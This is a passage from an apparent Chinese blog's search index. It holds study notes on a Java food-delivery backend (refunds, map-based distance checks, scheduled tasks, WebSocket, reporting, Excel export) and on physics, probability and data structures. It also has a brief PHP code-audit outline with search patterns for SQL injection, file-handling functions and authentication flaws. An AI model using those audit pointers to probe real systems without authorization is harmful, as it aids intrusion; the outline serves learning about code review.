\u0026amp;gt; 代替 接单、拒单、派送 简化为修改 status 字段，并且要处理退款逻辑\nService\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 /** * 拒单 * * @param ordersRejectionDTO */ public void rejection(OrdersRejectionDTO ordersRejectionDTO) throws Exception { // 根据id查询订单 Orders ordersDB = orderMapper.getById(ordersRejectionDTO.getId()); // 订单只有存在且状态为2（待接单）才可以拒单 if (ordersDB == null || !ordersDB.getStatus().equals(Orders.TO_BE_CONFIRMED)) { throw new OrderBusinessException(MessageConstant.ORDER_STATUS_ERROR); } //支付状态 Integer payStatus = ordersDB.getPayStatus(); if (payStatus == Orders.PAID) { //用户已支付，需要退款 String refund = weChatPayUtil.refund( ordersDB.getNumber(), ordersDB.getNumber(), new BigDecimal(0.01), new BigDecimal(0.01)); log.info(\u0026#34;申请退款：{}\u0026#34;, refund); } // 拒单需要退款，根据订单id更新订单状态、拒单原因、取消时间 Orders orders = new Orders(); orders.setId(ordersDB.getId()); orders.setStatus(Orders.CANCELLED); orders.setRejectionReason(ordersRejectionDTO.getRejectionReason()); orders.setCancelTime(LocalDateTime.now()); orderMapper.update(orders); } 距离检测 调用百度地图的接口，读文档即可\n设置地址、规划路径、判断\n添加到 ServiceImpl 1 2 3 4 5 @Value(\u0026#34;${sky.shop.address}\u0026#34;) private String shopAddress; @Value(\u0026#34;${sky.baidu.ak}\u0026#34;) private String ak; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 /** * 检查客户的收货地址是否超出配送范围 * @param address */ private void checkOutOfRange(String address) { Map map = new HashMap(); map.put(\u0026#34;address\u0026#34;,shopAddress); map.put(\u0026#34;output\u0026#34;,\u0026#34;json\u0026#34;); map.put(\u0026#34;ak\u0026#34;,ak); //获取店铺的经纬度坐标 String shopCoordinate = HttpClientUtil.doGet(\u0026#34;https://api.map.baidu.com/geocoding/v3\u0026#34;, map); JSONObject jsonObject = JSON.parseObject(shopCoordinate); if(!jsonObject.getString(\u0026#34;status\u0026#34;).equals(\u0026#34;0\u0026#34;)){ throw new OrderBusinessException(\u0026#34;店铺地址解析失败\u0026#34;); } //数据解析 JSONObject location = jsonObject.getJSONObject(\u0026#34;result\u0026#34;).getJSONObject(\u0026#34;location\u0026#34;); String lat = location.getString(\u0026#34;lat\u0026#34;); String lng = location.getString(\u0026#34;lng\u0026#34;); //店铺经纬度坐标 String shopLngLat = lat + \u0026#34;,\u0026#34; + lng; map.put(\u0026#34;address\u0026#34;,address); //获取用户收货地址的经纬度坐标 String userCoordinate = HttpClientUtil.doGet(\u0026#34;https://api.map.baidu.com/geocoding/v3\u0026#34;, map); jsonObject = JSON.parseObject(userCoordinate); if(!jsonObject.getString(\u0026#34;status\u0026#34;).equals(\u0026#34;0\u0026#34;)){ throw new OrderBusinessException(\u0026#34;收货地址解析失败\u0026#34;); } //数据解析 location = jsonObject.getJSONObject(\u0026#34;result\u0026#34;).getJSONObject(\u0026#34;location\u0026#34;); lat = location.getString(\u0026#34;lat\u0026#34;); lng = location.getString(\u0026#34;lng\u0026#34;); //用户收货地址经纬度坐标 String userLngLat = lat + \u0026#34;,\u0026#34; + lng; map.put(\u0026#34;origin\u0026#34;,shopLngLat); map.put(\u0026#34;destination\u0026#34;,userLngLat); map.put(\u0026#34;steps_info\u0026#34;,\u0026#34;0\u0026#34;); //路线规划 String json = HttpClientUtil.doGet(\u0026#34;https://api.map.baidu.com/directionlite/v1/driving\u0026#34;, map); jsonObject = JSON.parseObject(json); if(!jsonObject.getString(\u0026#34;status\u0026#34;).equals(\u0026#34;0\u0026#34;)){ throw new OrderBusinessException(\u0026#34;配送路线规划失败\u0026#34;); } //数据解析 JSONObject result = jsonObject.getJSONObject(\u0026#34;result\u0026#34;); JSONArray jsonArray = (JSONArray) result.get(\u0026#34;routes\u0026#34;); Integer distance = (Integer) ((JSONObject) jsonArray.get(0)).get(\u0026#34;distance\u0026#34;); if(distance \u0026gt; 5000){ //配送距离超过5000米 throw new OrderBusinessException(\u0026#34;超出配送范围\u0026#34;); } } 然后在 OrderServiceImpl 的 submitOrder 方法中调用上面的校验方法即可 SpringTask - 订单计时 Spring框架提供的任务调度工具，可以按照约定的时间自动执行某个代码逻辑。\nCron 表达式 cron表达式其实就是一个字符串，通过cron表达式可以定义任务触发的时间\n**构成规则：**分为6或7个域，由空格分隔开，每个域代表一个含义\n每个域的含义分别为：秒、分钟、小时、日、月、周、年(可选)\n**举例：**2022年10月12日上午9点整 对应的cron表达式为：0 0 9 12 10 ? 2022\n说明：一般日和周的值不同时设置，其中一个设置，另一个用？表示。\n通配符：\n* 表示所有值；\n? 表示未说明的值，即不关心它为何值；\n- 表示一个指定的范围；\n, 表示附加一个可能值；\n/ 符号前表示开始时间，符号后表示每次递增的值；\n使用步骤 导入 maven 坐标，spring-context 启动类添加注解 @EnableScheduling 开启任务调度 自定义定时任务类 定时任务类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 package com.sky.task; @Component @Slf4j public class OrderTask { @Autowired private OrderMapper orderMapper; /** * 处理支付超时订单 */ @Scheduled(cron = \u0026#34;0 * * * * ?\u0026#34;) public void processTimeoutOrder(){ log.info(\u0026#34;处理支付超时订单：{}\u0026#34;, new Date()); LocalDateTime time = LocalDateTime.now().plusMinutes(-15); // select * from orders where status = 1 and order_time \u0026lt; 当前时间-15分钟 List\u0026lt;Orders\u0026gt; ordersList = orderMapper.getByStatusAndOrdertimeLT(Orders.PENDING_PAYMENT, time); if(ordersList != null \u0026amp;\u0026amp; ordersList.size() \u0026gt; 0){ ordersList.forEach(order -\u0026gt; { order.setStatus(Orders.CANCELLED); order.setCancelReason(\u0026#34;支付超时，自动取消\u0026#34;); order.setCancelTime(LocalDateTime.now()); orderMapper.update(order); }); } } /** * 处理“派送中”状态的订单 */ @Scheduled(cron = \u0026#34;0 0 1 * * ?\u0026#34;) public void processDeliveryOrder(){ log.info(\u0026#34;处理派送中订单：{}\u0026#34;, new Date()); // select * from orders where status = 4 and order_time \u0026lt; 当前时间-1小时 LocalDateTime time = LocalDateTime.now().plusMinutes(-60); List\u0026lt;Orders\u0026gt; ordersList = orderMapper.getByStatusAndOrdertimeLT(Orders.DELIVERY_IN_PROGRESS, time); if(ordersList != null \u0026amp;\u0026amp; ordersList.size() \u0026gt; 0){ ordersList.forEach(order -\u0026gt; { order.setStatus(Orders.COMPLETED); orderMapper.update(order); }); } } } Mapper 1 2 3 //根据状态和下单时间查询订单 @Select(\u0026#34;select * from orders where status = #{status} and order_time \u0026lt; #{orderTime}\u0026#34;) List\u0026lt;Orders\u0026gt; getByStatusAndOrdertimeLT(Integer status, LocalDateTime orderTime); Websocket WebSocket 是基于 TCP 的一种新的网络协议。它实现了浏览器与服务器全双工通信——浏览器和服务器只需要完成一次握手，两者之间就可以创建持久性的连接， 并进行双向数据传输。\nWebSocket缺点：\n服务器长期维护长连接需要一定的成本 各个浏览器支持程度不一 WebSocket 是长连接，受网络限制比较大，需要处理好重连 **结论：**WebSocket并不能完全取代HTTP，它只适合在特定的场景下使用\nmaven 坐标 1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-websocket\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 服务组件定义 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package com.sky.websocket; /** * WebSocket服务 */ @Component @ServerEndpoint(\u0026#34;/ws/{sid}\u0026#34;) public class WebSocketServer { //存放会话对象 private static Map\u0026lt;String, Session\u0026gt; sessionMap = new HashMap(); /** * 连接建立成功调用的方法 */ @OnOpen public void onOpen(Session session, @PathParam(\u0026#34;sid\u0026#34;) String sid) { System.out.println(\u0026#34;客户端：\u0026#34; + sid + \u0026#34;建立连接\u0026#34;); sessionMap.put(sid, session); } /** * 收到客户端消息后调用的方法 * * @param message 客户端发送过来的消息 */ @OnMessage public void onMessage(String message, @PathParam(\u0026#34;sid\u0026#34;) String sid) { System.out.println(\u0026#34;收到来自客户端：\u0026#34; + sid + \u0026#34;的信息:\u0026#34; + message); } /** * 连接关闭调用的方法 * * @param sid */ @OnClose public void onClose(@PathParam(\u0026#34;sid\u0026#34;) String sid) { System.out.println(\u0026#34;连接断开:\u0026#34; + sid); sessionMap.remove(sid); } /** * 群发 * * @param message */ public void sendToAllClient(String message) { Collection\u0026lt;Session\u0026gt; sessions = sessionMap.values(); for (Session session : sessions) { try { //服务器向客户端发送消息 session.getBasicRemote().sendText(message); } catch (Exception e) { e.printStackTrace(); } } } } 配置类 用于注册 WebSocket 的服务端组件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package com.sky.config; /** * WebSocket配置类，用于注册WebSocket的Bean */ @Configuration @EnableWebsocket public class WebSocketConfiguration { @Bean public ServerEndpointExporter serverEndpointExporter() { return new ServerEndpointExporter(); } } Impl 里引用 1 2 3 4 5 6 7 8 orderMapper.update(orders); Map map = new HashMap(); map.put(\u0026#34;type\u0026#34;, 1);//消息类型，1表示来单提醒 map.put(\u0026#34;orderId\u0026#34;, orders.getId()); map.put(\u0026#34;content\u0026#34;, \u0026#34;订单号：\u0026#34; + outTradeNo); //通过WebSocket实现来单提醒，向客户端浏览器推送消息 webSocketServer.sendToAllClient(JSON.toJSONString(map)); 催单 类似\nWebSocket 不知道为什么连不上……\nApache Echarts、数据统计 Apache ECharts 是一款基于 Javascript 的数据可视化图表库，提供直观，生动，可交互，可个性化定制的数据可视化图表。\n营业额统计 **注意：**具体返回数据一般由前端来决定，前端展示图表，具体折现图对应数据是什么格式，是有固定的要求的。\nController 注意：@DateTimeFormat(pattern = \u0026quot;yyyy-MM-dd\u0026quot;) 指定格式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package com.sky.controller.admin; /** * 报表 */ @RestController @RequestMapping(\u0026#34;/admin/report\u0026#34;) @Slf4j @Api(tags = \u0026#34;统计报表相关接口\u0026#34;) public class ReportController { @Autowired private ReportService reportService; /** * 营业额数据统计 */ @GetMapping(\u0026#34;/turnoverStatistics\u0026#34;) @ApiOperation(\u0026#34;营业额数据统计\u0026#34;) public Result\u0026lt;TurnoverReportVO\u0026gt; turnoverStatistics( @DateTimeFormat(pattern = \u0026#34;yyyy-MM-dd\u0026#34;) LocalDate begin, @DateTimeFormat(pattern = \u0026#34;yyyy-MM-dd\u0026#34;) LocalDate end) { return Result.success(reportService.getTurnover(begin, end)); } } Service 用 map 来传递参数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package com.sky.service.impl; @Service @Slf4j public class ReportServiceImpl implements ReportService { @Autowired private OrderMapper orderMapper; /** * 根据时间区间统计营业额 * @param begin * @param end * @return */ public TurnoverReportVO getTurnover(LocalDate begin, LocalDate end) { List\u0026lt;LocalDate\u0026gt; dateList = new ArrayList\u0026lt;\u0026gt;(); dateList.add(begin); while (!begin.equals(end)){ begin = begin.plusDays(1);//日期计算，获得指定日期后1天的日期 dateList.add(begin); } List\u0026lt;Double\u0026gt; turnoverList = new ArrayList\u0026lt;\u0026gt;(); for (LocalDate date : dateList) { LocalDateTime beginTime = LocalDateTime.of(date, LocalTime.MIN); LocalDateTime endTime = LocalDateTime.of(date, LocalTime.MAX); Map map = new HashMap(); map.put(\u0026#34;status\u0026#34;, Orders.COMPLETED); map.put(\u0026#34;begin\u0026#34;,beginTime); map.put(\u0026#34;end\u0026#34;, endTime); Double turnover = orderMapper.sumByMap(map); turnover = turnover == null ? 0.0 : turnover; turnoverList.add(turnover); } //数据封装 return TurnoverReportVO.builder() .dateList(StringUtils.join(dateList,\u0026#34;,\u0026#34;)) .turnoverList(StringUtils.join(turnoverList,\u0026#34;,\u0026#34;)) .build(); } } Mapper 接收 map 直接取就可以 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;select id=\u0026#34;sumByMap\u0026#34; resultType=\u0026#34;java.lang.Double\u0026#34;\u0026gt; select sum(amount) from orders \u0026lt;where\u0026gt; \u0026lt;if test=\u0026#34;status != null\u0026#34;\u0026gt; and status = #{status} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;begin != null\u0026#34;\u0026gt; and order_time \u0026amp;gt;= #{begin} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;end != null\u0026#34;\u0026gt; and order_time \u0026amp;lt;= #{end} \u0026lt;/if\u0026gt; \u0026lt;/where\u0026gt; \u0026lt;/select\u0026gt; 用户统计 Service 自定义方法来计算总数 返回的是字符串，还要进行处理 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 @Override public UserReportVO getUserStatistics(LocalDate begin, LocalDate end) { List\u0026lt;LocalDate\u0026gt; dateList = new ArrayList\u0026lt;\u0026gt;(); dateList.add(begin); while (!begin.equals(end)){ begin = begin.plusDays(1); dateList.add(begin); } List\u0026lt;Integer\u0026gt; newUserList = new ArrayList\u0026lt;\u0026gt;(); //新增用户数 List\u0026lt;Integer\u0026gt; totalUserList = new ArrayList\u0026lt;\u0026gt;(); //总用户数 for (LocalDate date : dateList) { LocalDateTime beginTime = LocalDateTime.of(date, LocalTime.MIN); LocalDateTime endTime = LocalDateTime.of(date, LocalTime.MAX); //新增用户数量 select count(id) from user where create_time \u0026gt; ? and create_time \u0026lt; ? Integer newUser = getUserCount(beginTime, endTime); //总用户数量 select count(id) from user where create_time \u0026lt; ? Integer totalUser = getUserCount(null, endTime); newUserList.add(newUser); totalUserList.add(totalUser); } return UserReportVO.builder() .dateList(StringUtils.join(dateList,\u0026#34;,\u0026#34;)) .newUserList(StringUtils.join(newUserList,\u0026#34;,\u0026#34;)) .totalUserList(StringUtils.join(totalUserList,\u0026#34;,\u0026#34;)) .build(); } /** * 根据时间区间统计用户数量 * @param beginTime * @param endTime * @return */ private Integer getUserCount(LocalDateTime beginTime, LocalDateTime endTime) { Map map = new HashMap(); map.put(\u0026#34;begin\u0026#34;,beginTime); map.put(\u0026#34;end\u0026#34;, endTime); return userMapper.countByMap(map); } Mapper 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;select id=\u0026#34;countByMap\u0026#34; resultType=\u0026#34;java.lang.Integer\u0026#34;\u0026gt; select count(id) from user \u0026lt;where\u0026gt; \u0026lt;if test=\u0026#34;begin != null\u0026#34;\u0026gt; and create_time \u0026amp;gt;= #{begin} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;end != null\u0026#34;\u0026gt; and create_time \u0026amp;lt;= #{end} \u0026lt;/if\u0026gt; \u0026lt;/where\u0026gt; \u0026lt;/select\u0026gt; 订单统计 类似\n销量排行榜 Mapper 只返回前十条数据即可，用 limit 限制 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;select id=\u0026#34;getSalesTop10\u0026#34; resultType=\u0026#34;com.sky.dto.GoodsSalesDTO\u0026#34;\u0026gt; select od.name name,sum(od.number) number from order_detail od ,orders o where od.order_id = o.id and o.status = 5 \u0026lt;if test=\u0026#34;begin != null\u0026#34;\u0026gt; and order_time \u0026amp;gt;= #{begin} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;end != null\u0026#34;\u0026gt; and order_time \u0026amp;lt;= #{end} \u0026lt;/if\u0026gt; group by name order by number desc limit 0, 10 \u0026lt;/select\u0026gt; Apache POI Apache POI 是一个处理Miscrosoft Office各种文件格式的开源项目。简单来说就是，我们可以使用 POI 在 Java 程序中对Miscrosoft Office各种文件进行读写操作。 一般情况下，POI 都是用于操作 Excel 文件。\n坐标 1 2 3 4 5 6 7 8 9 10 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.poi\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;poi\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.16\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.poi\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;poi-ooxml\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.16\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 数据处理演示 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package com.sky.test; import org.apache.poi.xssf.usermodel.XSSFCell; import org.apache.poi.xssf.usermodel.XSSFRow; import org.apache.poi.xssf.usermodel.XSSFSheet; import org.apache.poi.xssf.usermodel.XSSFWorkbook; import java.io.File; import java.io.FileInputStream; import java.io.FileOutputStream; public class POITest { /** * 基于POI向Excel文件写入数据 * @throws Exception */ public static void write() throws Exception{ //在内存中创建一个Excel文件对象 XSSFWorkbook excel = new XSSFWorkbook(); //创建Sheet页 XSSFSheet sheet = excel.createSheet(\u0026#34;itcast\u0026#34;); //在Sheet页中创建行，0表示第1行 XSSFRow row1 = sheet.createRow(0); //创建单元格并在单元格中设置值，单元格编号也是从0开始，1表示第2个单元格 row1.createCell(1).setCellValue(\u0026#34;姓名\u0026#34;); row1.createCell(2).setCellValue(\u0026#34;城市\u0026#34;); XSSFRow row2 = sheet.createRow(1); row2.createCell(1).setCellValue(\u0026#34;张三\u0026#34;); row2.createCell(2).setCellValue(\u0026#34;北京\u0026#34;); XSSFRow row3 = sheet.createRow(2); row3.createCell(1).setCellValue(\u0026#34;李四\u0026#34;); row3.createCell(2).setCellValue(\u0026#34;上海\u0026#34;); FileOutputStream out = new FileOutputStream(new File(\u0026#34;D:\\\\itcast.xlsx\u0026#34;)); //通过输出流将内存中的Excel文件写入到磁盘上 excel.write(out); //关闭资源 out.flush(); out.close(); excel.close(); } public static void main(String[] args) throws Exception { write(); } } 数据读取演示 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package com.sky.test; import org.apache.poi.xssf.usermodel.XSSFCell; import org.apache.poi.xssf.usermodel.XSSFRow; import org.apache.poi.xssf.usermodel.XSSFSheet; import org.apache.poi.xssf.usermodel.XSSFWorkbook; import java.io.File; import java.io.FileInputStream; import java.io.FileOutputStream; public class POITest { /** * 基于POI读取Excel文件 * @throws Exception */ public static void read() throws Exception{ FileInputStream in = new FileInputStream(new File(\u0026#34;D:\\\\itcast.xlsx\u0026#34;)); //通过输入流读取指定的Excel文件 XSSFWorkbook excel = new XSSFWorkbook(in); //获取Excel文件的第1个Sheet页 XSSFSheet sheet = excel.getSheetAt(0); //获取Sheet页中的最后一行的行号 int lastRowNum = sheet.getLastRowNum(); for (int i = 0; i \u0026lt;= lastRowNum; i++) { //获取Sheet页中的行 XSSFRow titleRow = sheet.getRow(i); //获取行的第2个单元格 XSSFCell cell1 = titleRow.getCell(1); //获取单元格中的文本内容 String cellValue1 = cell1.getStringCellValue(); //获取行的第3个单元格 XSSFCell cell2 = titleRow.getCell(2); //获取单元格中的文本内容 String cellValue2 = cell2.getStringCellValue(); System.out.println(cellValue1 + \u0026#34; \u0026#34; +cellValue2); } //关闭资源 in.close(); excel.close(); } public static void main(String[] args) throws Exception { read(); } } 后续代码类似，要用到的时候再学吧，完结。\n","date":"2025-10-23T00:00:00Z","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-%E8%8B%8D%E7%A9%B9%E5%A4%96%E5%8D%96/","title":"苍穹外卖"},{"content":"参考视频：《大学物理-电磁学》\n电学 电场强度 库伦定律： 电场强度： 对于圆弧来说：dl = Rdθ\n一些结论： 电通量、高斯定理 电通量 静电场中高斯定理 电势 电势 电势能 电场和电势的关系 导体 为什么内部场强为零？ 导体上的电荷可以自由移动，移动后形成电场，与外部场强相抵消\n内部包围有电荷 q 时，导体上电荷分布？ 导体内层会感应出 -q，外层变为 Q+q。由高斯定理配合导体内场强为零，可知导体内部的 E * S = 0，故 q + -q = 0\n传导电流 若将导体的两端接到电源上, 导体中便有持续的电流，这种存在导体中的电流称为传导电流。\n电流密度 欧姆定律的微分形式 稳恒电流 可推导出基尔霍夫定律 电动势 电容器 串并联 串联时电荷相等 并联时电压相等 C = C1 + …… + Cn 特例：\n电解质、电场能 电介质高斯定理 电场能 磁学 磁感应强度 判断方向 毕奥萨法尔定律 结论：\n安培环路定理： 磁通量、高斯定理 分类：\n安培力、磁矩、洛伦兹力 安培力 磁矩 洛伦兹力 磁介质、磁场能 磁介质 磁场能量 ","date":"2025-10-22T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/","title":"大学物理（下）"},{"content":"参考：代码审计-PHP篇\n原生开发 关键词挖掘 功能挖掘 SQL 注入 正则搜索 (update|select|insert|delete|).*?where.*= 需要搭配经验筛选，模板比较不容易出漏洞 看文件路径，后台漏洞不容易利用 找可执行变量、过滤，跟踪函数声明、用例 MySQL Monitor Client 跟踪项目 文件安全 发现\n脚本文件名 upload del delfile down downfile read readfile 应用功能点 下载、上传、读取…… \u0026ndash;\u0026gt; 抓包找路径 操作关键字 $_FILES、move_uploaded_file、unlink 遇见代码加密\n需要查找对应解密方法 模型开发 MVC ：Model、Controller、View\nMVC 对审计的影响\n文件代码定位：功能被封装，不好搜索 代码过滤分析 前端安全发现 版本对比的漏洞发现\n新版本修复，反推旧版本漏洞；根据旧版本漏洞看是否修复 Beyond、UltraCompare 项目 动态调试 phpstorm + phpstudy + xdebug 鉴权漏洞 未引用的鉴权逻辑 错误逻辑：先功能操作后鉴权 脆弱的、不严谨的 没有引用鉴权模块的，可以直接进入 ","date":"2025-10-22T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-php/","title":"代码审计-PHP"},{"content":"参考视频：概率论四小时速成\n随机事件与概率 事件关系与运算率 事件关系：\n运算律：\n概率计算性质 注意：对于多项依然成立 集合并 == 概率 +\n集合且 == 概率 ·\n补充：容斥原理\n条件概率 条件概率与乘法公式：\n事件的独立性 独立不互斥，互斥不独立\n多事件独立性：\n全概率 - 贝叶斯公式：\n随机变量分布 分布函数： 备注：\n概率 - 分布函数关系：配凑出范围\n分布函数的充要条件： 等号跟大于走，永远右连续\n根据规范性、右连续性，可以用极限解方程求参数\n常识结论： 离散型随机变量 分布律可以写成表格的形式\n古典概型： 根据分布律写分布函数： 根据定义域划分范围，依次求和 二项分布 独立重复、事件 A 发生的次数\n几何概型： 几何分布 事件首次发生的概率\n二项 01 分布 泊松分布 注意一个代换：\n连续型随机变量 概率密度： 概率为 0 的事件可能发生\n概率密度的积分就成为概率 \u0026ndash;\u0026gt; 在哪求概率，就在哪求积分\n充要条件：\n与分布函数： 分定义域求积分\n均匀分布 指数分布 利用指数分布的无记忆性，转换区间\n正态分布 标准化： 先变换为标准正态，再求概率（用标准正态的分布函数表示）\n根据形式配凑\n已知 X，求 f(X) 的分布函数 关键在于根据 Y \u0026lt;= y 转换出 X ~ y 关系，用 X 的分布函数代换出 Y 的\n二维随机变量 离散型 联合分布律 独立性 有 p_ij = 0，一定不独立\n独立 == 各行（列）成比例\n连续型 分布密度、概率 找区域，二重积分即可\n独立性 边缘密度 对另一个变量积分\n条件概率密度 固定某个参数后，概率密度只域另一个参数有关\n二位均匀 求面积之比即可\n最大、最小值分布 二维连续型函数分布 分布函数法：\n换元 做正概区域范围 D_z 和 g(x,y) 观察交集 根据 z 从负无穷到正无穷，对 x，y 积分（z 作为常数） 公式法：\n需要可以反解出 y 才可使用，替换 x 或 y 以后，再乘上偏导\n注意定义域的选定\n","date":"2025-10-22T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-%E6%A6%82%E7%8E%87%E8%AE%BA/","title":"概率论"},{"content":"绪论 数据结构 形式定义：\n数据结构是一个四元组 Data_Structure=（D,L,S,O） D是数据元素的有限集 L是D上客观存在的关系（逻辑结构） S是关系L在计算机中的存储表示（存储结构） O是D上规定的一组操作。 组成：\n集合（set）—若干具有共同特征的事物的“聚合”。\n数据（data) —所有能输入到计算机中的描述客观事物的符号\n数据元素（data element）—数据的基本单位，也称节点（node）或记录（record）\n数据项（data item）—有独立含义的数据最小单位，也称域(field)\n关键码（key）—数据元素中能起标识作用的数据项。\n关系 —集合中元素之间的某种相关性\n逻辑结构\n线性结构：一对一，线性表、栈、队列等 树形结构 图状结构 存储结构\n顺序：借助相对位置表示元素间关系 链式：借助指针 散列：通过对关键字直接计算 算法 为了解决某类问题而规定的一个有限长的操作序列\n特性：有穷、确定、可行、功能性\n目标：正确、可读、健壮、高效率与低存储量需求\n衡量方法\n算法的时间特性用执行基本操作次数来度量 算法的空间特性用算法运行所需存储量的增长率 线性表、栈与队列 线性结构特点：在数据元素的非空有限集中 存在唯一一个称作“第一个”的数据元素 存在唯一一个称作“最后一个”的数据元素 除第一个外，集合中的每个数据元素均只有一个前驱 除最后一个外，集合中的每个数据元素均只有一个后继 线性表 定义：一个线性表是n个数据元素的有限序列 元素个数n = 表长度 a_1 无直接前驱，a_n 无直接后继 i 为 a_i 再线性表中的位序 顺序存储 逻辑上相邻 - 物理地址相邻\n操作\n插入：复杂度 n/2，算在 i 出的平均移动次数\n删除：复杂度 (n-1)/2\n优点：\n逻辑相邻，物理相邻 可随机存取任一元素 存储空间使用紧凑 缺点：\n插入、删除操作需要移动大量的元素 预先分配空间需按最大空间分配，利用不充分 表容量难以扩充 链式存储 特点： 用一组任意的存储单元存储线性表的数据元素，利用指针实现：用不相邻的存储单元存放逻辑上相邻的元素 每个数据元素ai，除存储本身信息外，还需存储其直接后继的信息 单链表 结构：\n1 2 3 4 5 6 7 8 9 typedef struct ListNode { ElemType data; struct ListNode *next; }ListNode,*ListNodePtr; // 生成新节点 p=(ListNodePtr) malloc ( sizeof ( ListNode )); // 回收节点 free(p) 操作\n查找：O(n) 插入、删除：O(1) 特点：\n动态结构，整个存储空间为多个链表共用\n不需预先分配空间，指针额外存储空间\n不能随机读取，查找慢\n循环链表 表中最后一个结点的指针指向头结点，使链表构成环状\n从表中任一结点出发均可找到表中其他结点， 提高查找效率\n操作与单链表基本一致,循环条件不同： 单链表 p 或 p-\u0026gt;next=NULL 循环链表 p-\u0026gt;next=h 双向链表 解决单链表单向性的问题，存储前、后指针\n栈 顺序存储 定义： 限定仅在表尾进行插入或删除操作的线性表，进行操作的一端称栈顶，固定的一端称栈底，不含元素的空表称空栈。 先进后出 操作： 用指针 top 始终指向栈顶，初值为 -1 （栈空），终值为 M-1 （栈满） 1 2 3 4 5 6 // 初始化 #define MAXSTACK 100 typedef struct{ int top; StackEntry entry[MAXSTACK]; }SqStack; 链式存储 top 始终指向下一个插入的位置，类似\n队列 限定只能在表的一端进行插入，在表的另一端进行删除的线性表，先进先出\n链式存储 设队首、队尾指针 front 和rear, front 指向头结点，rear 指向队尾\n问题：\n队列不满时假溢出、队列满时真溢出 解决：\n队首固定：需要频繁移动 X 循环队列：将队列设计成环形，让 让sq[0] 接在 sq[M-1] 之后，若 rear == M，则令 rear = 0 问题：队空和队满标志一样 解决：另设标志位、少用一个元素空间、用一个计数变量 优先队列 不完全遵守先进先出，设有优先级\n数组 顺序存储： 需要区分列主序、行主序\nLoc (j1, j2, ... , jn )=Loc (0, 0, ... , 0)+(b2*b3*...*bn*j1 + b3*b4*...*bn*j2+ ...+bn*jn-1+ jn)*l\n三角矩阵：\n三对角矩阵：\n稀疏矩阵：\n链式存储 表示矩阵：\n数组 + 链表\n查找、排序、递归 递归 定义：\n一个过程或函数出现调用本过程或本函数的成分,称之为递归。 若调用自身,称之为直接递归。若过程或函数p调用过程或函数q,而q又调用 p,称之为间接递归。 如果一个递归过程或递归函数中递归调用语句是最后一条执行语句,则称这种递归调用为尾递归。 查找 顺序表 顺序查找，改变 R[0] 以控制结束： 1 2 3 4 5 int seqsearch(DataType R[], KeyType key){ R[0].key=key, i=n; while (R[i].key != key) i=i-1; return i; } 折半查找，对于有序表 1 2 3 4 5 6 7 8 9 10 11 12 13 int BinarySearch(DataType SL[], KeyType key, int n){ //在长度为n的有序表SL中折半查找其关键字等于key的数据元素 //查找成功返回其在有序表中的位置，查找失败否返回0 int low=1; int high=n; while(low\u0026lt;=high){ mid=(low+high)/2; if(key = = SL[mid].key) {return mid;} else if( key\u0026gt;SL[mid].key) low=mid+1; else high=mid-1; } return 0; } 索引表查找 基本思想：将原表分成若干块，各块内部不一定有序，但表中的块是“分块有序”的，抽取各块中的最大关键字及其起始位置建立索引表。 块间顺序：复杂度 1/2 * (n/s + s) + 1 (n 长度，分成 n/s 块) 块间二分：log_2(n/s + 1) + s/2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 int IndexSequelSearch(IndexType ls[], 